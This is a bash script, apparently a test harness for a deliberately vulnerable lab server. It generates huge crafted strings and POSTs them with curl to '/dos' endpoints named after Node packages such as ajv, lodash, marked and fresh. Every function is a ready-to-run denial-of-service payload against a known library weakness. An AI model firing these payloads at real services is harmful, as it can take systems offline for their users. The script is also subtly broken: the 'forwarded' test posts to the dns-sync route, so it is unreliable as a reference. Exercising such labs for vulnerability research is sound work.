#!/bin/bash
set +x

generate() {
    # echo "Running generation... Hold tight." > /dev/null
    # start=`date +%s`

    LENGTH=$1
    CHAR=$2
    RESULT=""
    for ((i = 0; i <= $LENGTH; i++))
    do
        RESULT=$RESULT$CHAR
    done

    # end=`date +%s`
    # runtime=$((end-start))
    # echo "All done!" > /dev/null
    # echo "Took: ${runtime}s" > /dev/null
    echo $RESULT
}

makeJson() {
    STR=$1
    jo -p title=$STR > ../data.json
}

runAjvDos() {
    fin="$(generate 10000 "if(")x$(generate 10000 ")")"
    makeJson $fin
    curl -d "@../data.json" -H "Content-Type: application/json" -X POST ${URL}/ajv/dos
}

runCharsetDos() {
    fin="$(generate 40000 " ")"
    makeJson $fin
    curl -d "@../data.json" -H "Content-Type: application/json" -X POST ${URL}/charset/dos
}

runContentTypeParserDos() {
    fin="$(generate 30000 "/")"
    makeJson $fin
    curl -d "@../data.json" -H "Content-Type: application/json" -X POST ${URL}/content-type-parser/dos
}

runContentDos() {
    fin="$(generate 2000 " ")"
    makeJson $fin
    curl -d "@../data.json" -H "Content-Type: application/json" -X POST ${URL}/content/dos
}

runDebugDos() {
    fin="$(generate 40000 ' ')"
    makeJson $fin
    curl -d "@../data.json" -H "Content-Type: application/json" -X POST ${URL}/debug/dos
}

runDnsSyncDos() {
    fin="$(generate 40 "a")"
    makeJson $fin
    curl -d "@../data.json" -H "Content-Type: application/json" -X POST ${URL}/dns-sync/dos
}

runForwardedDos() {
    fin="$(generate 60000 ' ')"
    makeJson $fin
    curl -d "@../data.json" -H "Content-Type: application/json" -X POST ${URL}/dns-sync/dos
}

runFreshDos() {
    fin="$(generate 60000 ' ')"
    makeJson $fin
    curl -d "@../data.json" -H "Content-Type: application/json" -X POST ${URL}/fresh/dos
}

runHtmlParserDos() {
    fin="$(generate 50000 " ")"
    makeJson $fin
    curl -d "@../data.json" -H "Content-Type: application/json" -X POST ${URL}/htmlparser/dos
}

runIsMobileJsDos() {
    fin="$(generate 20000 "X")"
    makeJson $fin
    curl -d "@../data.json" -H "Content-Type: application/json" -X POST ${URL}/ismobilejs/dos
}

runLodashDos() {
    fin="$(generate 80000 "A")"
    makeJson $fin
    curl -d "@../data.json" -H "Content-Type: application/json" -X POST ${URL}/lodash/dos
}

#how do I generate multiple text?
runMarkedDos() {
    fin="$(generate 8 "\`")$(generate 700 " ")$(generate 11 "\`")"
    makeJson $fin
    curl -d "@../data.json" -H "Content-Type: application/json" -X POST ${URL}/marked/dos
}





